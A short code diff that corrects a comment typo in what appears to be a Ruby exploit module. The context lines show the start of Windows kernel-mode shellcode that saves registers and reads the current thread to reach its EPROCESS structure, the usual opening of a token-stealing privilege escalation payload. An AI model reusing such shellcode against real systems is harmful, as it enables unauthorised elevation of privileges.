@@ -85,7 +85,7 @@ EOS
 
     ring0_code =
       #"\xcc" +
-      # save registers -- necessary for successfuly recovery
+      # save registers -- necessary for successful recovery
       "\x60" +
       # get EPROCESS from ETHREAD
       "\x64\xa1\x24\x01\x00\x00" +
